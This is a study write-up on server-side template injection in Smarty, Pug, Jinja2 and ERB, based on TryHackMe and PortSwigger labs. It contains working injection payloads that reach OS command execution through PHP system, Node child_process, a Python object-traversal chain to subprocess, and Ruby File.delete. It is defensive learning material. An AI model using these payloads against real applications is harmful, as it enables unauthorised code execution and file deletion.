# Template Engines and Evaluation

## Important rule

Do not assume the engine from one generic payload. Different engines use different syntax and may produce different results from similar expressions.

The examples below are authorised-lab observations, not universal payloads for every version or configuration.

## Smarty / PHP

Smarty is a PHP template engine. In the TryHackMe lab, a simple modifier operation changed text to uppercase, demonstrating that the input was parsed as Smarty syntax rather than displayed literally.

The learning path was:

```text
controlled input
  -> Smarty expression evaluation
  -> access to an allowed PHP function in the lab
  -> operating-system command execution
```

Lab-only examples:

```smarty
{'Hello'|upper}
```

The uppercase result confirmed Smarty evaluation. In the deliberately vulnerable lab, the following form demonstrated deeper impact:

```smarty
{system("ls")}
```

Important distinctions:

- The initial proof was template evaluation.
- A later PHP function call demonstrated deeper impact.
- Not every Smarty configuration permits arbitrary PHP functions.
- Security policy, allowed modifiers, plugins, and version affect impact.

## Pug / Node.js

Pug compiles template source into JavaScript and passes data as locals. The safe pattern is a static Pug file plus a data object.

```javascript
res.render('profile', { username: userInput });
```

The vulnerable pattern is dynamically compiling Pug source that contains user-controlled text.

### Interpolation

- `#{...}` evaluates an expression and escapes its rendered HTML output.
- `!{...}` evaluates an expression and inserts unescaped output.

Escaping helps with XSS in the output. It does not stop expression evaluation when the user controls template source.

### `spawnSync()` lesson

The Node.js API separates the executable, its arguments, and process options:

```javascript
spawnSync(command, args, options)
```

Correct form:

```javascript
spawnSync('ls', ['-lah'])
```

Incorrect form:

```javascript
spawnSync('ls -lah')
```

With no shell parsing, the second example attempts to find an executable whose name is effectively the entire string.

The third parameter is an options object, not another command:

```javascript
spawnSync('ls', ['-lah'], { cwd: '/tmp' })
```

`spawnSync().stdout` is a Buffer, so text output may need:

```javascript
result.stdout.toString()
```

### My mistake

I initially tried to place another command in the third parameter and also passed a command plus filename as one string. This was an API-usage error, not a failure of the SSTI itself.

### Lab-only Pug example

The completed THM exercise used an environment-specific chain similar to:

```pug
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout.toString()}
```

This example is recorded to explain the process API and the lab result, not as a universal payload.

### Environment-dependent object paths

A lab path using objects such as `process.mainModule` is version- and environment-dependent. It may change with:

- CommonJS versus ESM,
- Node.js version,
- available template locals,
- sandboxing,
- application startup method.

It should be documented as a lab technique, not a universal Pug payload.

## Jinja2 / Python

Jinja uses a Python-like template language. It does not simply provide unrestricted Python execution inside every `{{ ... }}` block.

A basic calculation proves template evaluation, not full Python or OS execution.

In the TryHackMe lab, a longer object-traversal chain reached Python runtime objects and then the `subprocess` module. The important model was:

```text
Jinja expression
  -> Python object graph
  -> import functionality
  -> subprocess API
  -> external process
```

### `check_output()` lesson

Python's `subprocess.check_output()` uses `shell=False` by default.

A command with no arguments can work as one string:

```python
subprocess.check_output('ls')
```

A command with arguments should be separated:

```python
subprocess.check_output(['ls', '-lah'])
```

This usually fails:

```python
subprocess.check_output('ls -lah')
```

Without a shell, Python does not split the string into an executable and arguments. It attempts to locate an executable matching the whole string.

`check_output()` returns bytes unless text/encoding options are used, so output may look like:

```text
b'file1\nfile2\n'
```

### Security nuance

Using an argument list and leaving `shell=False` reduces shell interpretation. It does not make process execution safe when an attacker controls:

- the executable,
- sensitive arguments,
- file paths or options with dangerous meaning,
- the code path that invokes the process.

### Lab-only Jinja2 example

The completed THM exercise used an environment-specific object traversal chain similar to:

```jinja2
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

The hard-coded index was specific to that lab environment.

### Environment-dependent object paths

Jinja object traversal using `__mro__`, `__subclasses__()`, and a hard-coded class index depends on the Python version, imported modules, framework, and load order. A class index that works in one lab may be wrong elsewhere.

## ERB / Ruby

ERB embeds Ruby expressions in templates. In the completed PortSwigger lab, an arithmetic expression returned `49`, proving that the `message` parameter was evaluated by ERB.

The lab then used Ruby's direct file API:

```ruby
File.delete('/home/carlos/morale.txt')
```

This was useful because it did not require starting a shell or invoking `rm`.

The chain was:

```text
message parameter
  -> ERB template source
  -> Ruby expression
  -> File.delete()
  -> file deletion
```

The original vulnerability remained SSTI. File deletion was the demonstrated impact.

## Engine comparison

| Engine | Runtime | Basic lab proof | Deeper lab impact path |
|---|---|---|---|
| Smarty | PHP | Modifier or expression changes output | Allowed PHP function |
| Pug | Node.js / JavaScript | JavaScript expression result | Node runtime and child process API |
| Jinja2 | Python | Template expression result | Python object graph and subprocess |
| ERB | Ruby | Ruby expression result | Ruby file or process APIs |

## Main lesson

A working expression is only the first evidence point.

```text
evaluation confirmed
  != automatically full RCE
```

The next question is always what objects, functions, and privileges are actually reachable in that specific environment.
